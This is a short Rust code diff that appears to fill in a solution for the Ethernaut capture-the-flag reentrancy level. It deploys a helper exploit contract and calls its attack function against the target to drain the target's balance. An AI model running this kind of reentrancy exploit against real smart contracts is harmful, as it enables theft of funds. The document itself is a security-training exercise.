@@ -1,3 +1,4 @@
+use crate::abi::donatexploit::Donatexploit;
 use async_trait::async_trait;
 use ctf::ethernaut::lvl10_reentrancy::*;
 use ethers::prelude::*;
@@ -27,6 +28,16 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let target = Reentrance::new(target.address, offender.to_owned());
+
+        let value = offender.get_balance(target.address(), None).await? / 2;
+
+        let exploit =
+            Donatexploit::deploy(offender.to_owned(), target.address())?
+                .send()
+                .await?;
+        exploit.attack().value(value).send().await?.await?;
+
         Ok(())
     }
 }
